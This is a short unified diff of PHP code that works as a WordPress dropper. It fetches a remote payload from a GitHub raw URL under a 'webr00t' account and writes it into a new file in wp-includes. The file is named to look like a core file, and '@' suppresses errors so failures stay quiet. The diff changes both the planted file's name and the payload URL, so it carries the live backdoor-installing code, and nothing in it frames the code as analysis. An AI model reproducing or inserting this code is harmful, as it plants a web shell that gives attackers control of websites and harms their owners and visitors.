@@ -1,9 +1,9 @@
-$yol = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/class-comment.php";
+$yol = $_SERVER["DOCUMENT_ROOT"]."/wp-includes/class-wp-run.php";
 if ( file_exists( $yol ) ) {
 //unlink($yol);
 }else {
 @touch($yol);
-@$h = file_get_contents("https://raw.githubusercontent.com/webr00t/web/master/d.txt");
+@$h = file_get_contents("https://raw.githubusercontent.com/webr00t/web/master/run.txt");
 @$kayit = fopen($yol, "a"); 
 @fwrite($kayit,$h);
 @fwrite($kayit,"\r\r");
